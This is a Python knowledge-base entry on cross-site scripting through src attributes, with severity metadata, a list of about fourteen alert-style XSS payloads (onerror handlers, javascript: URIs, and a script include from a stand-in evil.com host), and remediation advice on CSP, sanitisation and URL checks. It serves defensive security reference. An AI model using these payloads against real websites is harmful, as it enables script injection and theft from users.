#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: SRC Attribute Context XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via SRC Attributes",
    "severity": "high",
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "src", "img", "iframe", "script", "video", "audio", "source"],
    "description": """
SRC attribute XSS exploits elements that load external resources. Invalid src values
trigger error handlers, and certain protocols execute JavaScript directly.

SEVERITY: HIGH
Image tags with onerror are the most common XSS vector. Works even with strict filters.
Affects img, script, iframe, video, audio, source, embed, object, and more.
""",
    "attack_vector": """
IMG ONERROR:
<img src=x onerror=alert(1)>

IFRAME JAVASCRIPT:
<iframe src="javascript:alert(1)">

SCRIPT SRC:
<script src="https://evil.com/xss.js">

VIDEO ONERROR:
<video src=x onerror=alert(1)>

AUDIO ONERROR:
<audio src=x onerror=alert(1)>

SOURCE ONERROR:
<video><source src=x onerror=alert(1)></video>

EMBED SRC:
<embed src="javascript:alert(1)">

OBJECT DATA:
<object data="javascript:alert(1)">

INPUT IMAGE:
<input type=image src=x onerror=alert(1)>

BODY BACKGROUND:
<body background="javascript:alert(1)">

TABLE BACKGROUND:
<table background="javascript:alert(1)">

SVG IMAGE:
<svg><image href=x onerror=alert(1)></svg>

SRCSET BYPASS:
<img srcset="x 1w" onerror=alert(1)>

POSTER ATTRIBUTE:
<video poster=x onerror=alert(1)>
""",
    "remediation": """
DEFENSE:

1. VALIDATE URLs before setting src
2. Use allowlists for domains
3. Block javascript: and data: protocols
4. Sanitize HTML to remove event handlers
5. Use CSP with strict img-src/script-src
6. Implement Subresource Integrity (SRI)

CSP EXAMPLE:
Content-Security-Policy:
  img-src 'self' https://trusted-cdn.com;
  script-src 'self';
  frame-src 'none';

SANITIZATION:
// Remove all event handlers
element.removeAttribute('onerror');
element.removeAttribute('onload');

URL VALIDATION:
const isSafeUrl = (url) => {
  const u = new URL(url, location.origin);
  return u.protocol === 'https:' || u.protocol === 'http:';
};

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- HTML5 Security Cheat Sheet
""",
}
